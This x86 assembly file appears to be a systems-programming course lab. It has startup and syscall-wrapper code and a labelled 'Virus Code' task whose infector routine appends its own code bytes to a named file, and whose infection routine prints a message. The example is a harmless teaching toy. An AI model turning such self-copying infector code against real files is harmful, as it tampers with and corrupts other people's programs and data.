section .text
global _start
global system_call
extern main
_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

; ===== Task 2.B: Virus Code =====

section .rodata
    virus_msg db "Hello, Infected File", 10
    virus_msg_len equ $ - virus_msg

section .text
global infection
global infector

code_start:

; void infection() - prints "Hello, Infected File" to stdout
infection:
    ; write(1, virus_msg, virus_msg_len)
    mov eax, 4              ; sys_write
    mov ebx, 1              ; stdout
    mov ecx, virus_msg      ; message
    mov edx, virus_msg_len  ; length
    int 0x80
    ret

; void infector(char* filename) - appends virus code to a file
infector:
    push ebp
    mov ebp, esp
    
    ; Get filename argument
    mov ebx, [ebp+8]        ; filename
    
    ; open(filename, O_WRONLY | O_APPEND, 0)
    mov ecx, 1025           ; O_WRONLY (1) | O_APPEND (1024)
    mov edx, 0
    mov eax, 5              ; sys_open
    int 0x80
    
    ; Check for error
    cmp eax, 0
    jl .infector_error
    
    mov ebx, eax            ; save file descriptor in ebx
    
    ; write(fd, code_start, code_end - code_start)
    mov eax, 4              ; sys_write
    ; ebx already has fd
    mov ecx, code_start     ; start of virus code
    mov edx, code_end
    sub edx, code_start     ; length = code_end - code_start
    int 0x80
    
    ; close(fd)
    mov eax, 6              ; sys_close
    ; ebx still has fd
    int 0x80

.infector_error:
    pop ebp
    ret

code_end:
